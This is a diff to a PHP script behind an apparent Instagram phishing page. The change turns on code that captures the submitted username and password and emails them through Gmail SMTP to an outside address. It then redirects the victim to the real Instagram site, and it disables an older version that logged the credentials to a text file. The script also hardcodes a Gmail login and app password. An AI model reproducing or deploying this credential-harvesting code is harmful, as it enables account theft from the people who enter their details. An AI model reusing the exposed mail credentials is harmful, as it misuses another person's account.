@@ -1,63 +1,51 @@
 <?php
-echo "Прошло7";
+
 ini_set('display_errors', '1');
 
 $username=$_POST['username'];
 $password=$_POST['password'];
 
-// use PHPMailer\PHPMailer\PHPMailer;
-// use PHPMailer\PHPMailer\SMTP;
-// use PHPMailer\PHPMailer\Exception;
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
 
-// require __DIR__ .'/PHPMailer/src/Exception.php';
-// require __DIR__ .'/PHPMailer/src/PHPMailer.php';
-// require __DIR__ .'/PHPMailer/src/SMTP.php';
+require __DIR__ .'/PHPMailer/src/Exception.php';
+require __DIR__ .'/PHPMailer/src/PHPMailer.php';
+require __DIR__ .'/PHPMailer/src/SMTP.php';
 
-// $mail = new PHPMailer(true);
-// $mail-> isSMTP();
+$mail = new PHPMailer(true);
+$mail-> isSMTP();
 
-// try {
-//     $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
-//     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-//     $mail->Username   = 'mrsterixmr@gmail.com';                     //SMTP username
-//     $mail->Password   = 'ppamjhevewmihvqz';                               //SMTP password
-//     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
-//     $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+try {
+    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+    $mail->Username   = 'mrsterixmr@gmail.com';                     //SMTP username
+    $mail->Password   = 'ppamjhevewmihvqz';                               //SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
+    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
-//     //Recipients
-//     $mail->setFrom('from@example.com', 'Logins');
-//     $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient
-
-
-//     $message = "Login: ". $username." | Password: ". $password;
-
-//     //Content
-//     $mail->isHTML(true);                                  //Set email format to HTML
-//     $mail->Subject = 'Here is the subject';
-//     $mail->Body    = $message;
-//     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
-
-//     $mail->send();
-//     echo 'Message has been sent';
-// } catch (Exception $e) {
-//     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-// }
+    //Recipients
+    $mail->setFrom('from@example.com', 'Instagram Logins:');
+    $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient
 
 
+    $message = "Login: ". $username." | Password: ". $password;
 
-// $fp = fopen('data.txt', 'a+');
-// fwrite($fp, "login - ". $username."\n");
-// fwrite($fp, "password - ". $password."\n");
-// fwrite($fp, "--------------------------"."\n");
-// fclose($fp);
-// $filename = "data.txt";
-// echo file_get_contents($filename);
-// echo __FILE__;
+    //Content
+    $mail->isHTML(true);                                  //Set email format to HTML
+    $mail->Subject = 'Instagram Logins:';
+    $mail->Body    = $message;
+    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
+    $mail->send();
+    echo 'Message has been sent';
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
 
-// file_put_contents("data.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-$write = file_put_contents('data.txt', "Insta user: {$_POST['username']} pass: {$_POST['password']}" . PHP_EOL, FILE_APPEND);
-var_dump($write);
-// header('Location: https://instagram.com');
-// exit();
+// $write = file_put_contents('data.txt', "Insta user: {$_POST['username']} pass: {$_POST['password']}" . PHP_EOL, FILE_APPEND);
+// var_dump($write);
+
+header('Location: https://instagram.com');
+exit();
 ?> 
